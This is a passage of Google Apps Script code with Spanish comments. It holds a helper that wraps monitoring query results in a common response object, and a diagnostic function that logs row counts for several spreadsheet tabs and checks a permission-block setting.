 * Envoltorio común de las cuatro consultas. Que todas contesten con la misma forma es lo que
 * permite que la pantalla tenga UNA tabla y no cuatro, y que el aviso de «esto viene recortado»
 * se escriba una sola vez.
 */
function monRespuesta_(r, rango, extra) {
  const base = {
    success: true,
    filas: r.filas,
    total: r.filas.length,
    truncado: r.truncado === true,
    leidas: r.leidas || 0,
    desde: rango.desde.toISOString(),
    hasta: rango.hasta.toISOString(),
    porDefecto: rango.porDefecto === true,
    // Qué mitad del rango puso el servidor por su cuenta, para que la pantalla lo diga.
    completado: rango.completado || '',
    candidatas: r.candidatas || 0
  };
  Object.keys(extra || {}).forEach(function (k) { base[k] = extra[k]; });
  return base;
}

// ── DIAGNÓSTICO (desde el editor) ────────────────────────────────────────────

/** Estado de los cuatro rastros que alimenta esta sección. Ejecutar desde el editor. */
function monDiagnostico() {
  Logger.log('═══ MONITOREO ═══');
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const filas = function (nombre) {
    const s = ss.getSheetByName(nombre);
    return s ? Math.max(0, s.getLastRow() - 1) + ' fila(s)' : 'la hoja no existe todavía';
  };
  Logger.log('Cotizaciones: ' + filas(COTIZACIONES_SHEET_NAME));
  Logger.log('Correos:      ' + filas(MET_SHEET_NAME));
  Logger.log('Búsquedas:    ' + filas(MON_BUSQ_SHEET));
  Logger.log('Cambios:      ' + filas(CONSOLA_BITACORA_SHEET));
  Logger.log('Bloque "' + MON_BLOQUE + '" en el catálogo: ' +
             (PERM_IDS.indexOf(MON_BLOQUE) !== -1 ? 'sí' : 'NO — la pestaña no se le abre a nadie'));
  return true;
}
